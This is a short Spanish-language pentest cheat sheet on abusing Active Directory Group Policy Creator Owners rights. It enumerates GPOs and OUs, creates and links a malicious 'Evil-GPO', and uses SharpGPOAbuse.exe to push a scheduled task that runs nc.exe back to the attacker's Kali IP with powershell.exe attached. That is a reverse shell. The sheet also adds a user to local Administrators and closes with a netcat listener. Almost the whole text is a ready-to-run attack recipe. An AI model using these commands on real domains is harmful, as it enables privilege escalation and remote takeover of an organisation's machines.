Policy Creator Owners

PowerShell: Enumeración

# Ver políticas existentes (Podriamos modificarlas con SharpGPOAbuse.exe)
get-GPO -All
# Enumerar OU del AD desde CMD
dsquery ou -limit 0
# Enumerar OU del AD desde PowerShell
Import-Module ActiveDirectory
Get-ADDomainController -Identity "<hostname>" | Select-Object HostName, ComputerObjectDN

PowerShell: Crear GPO 'Evil-GPO' maliciosa

New-GPO -Name Evil-GPO | New-GPLink -Target "OU=<ou_ad>,DC=<domain>,DC=<domain>" -LinkEnabled Yes

SharpGPOAbuse.exe + nc.exe

PowerShell: Abusar GPO

# Payload: Ejecutar nc.exe como Administrator
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "EvilTask" --Author "<domain>.<domain>\Administrator" --Command "cmd.exe" --Arguments "/c C:\Users\<user>\nc.exe <kali_ip> 443 -e powershell.exe" --GPOName "Evil-GPO" --Force

# Payload: Añadir a un usuario al grupo Administrator
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Evil-GPO"

PowerShell: Forzar que se apliquen las políticas del GPO malicioso

gpupdate /force
# Listener desde Kali
rlwrap nc -nlvp 443
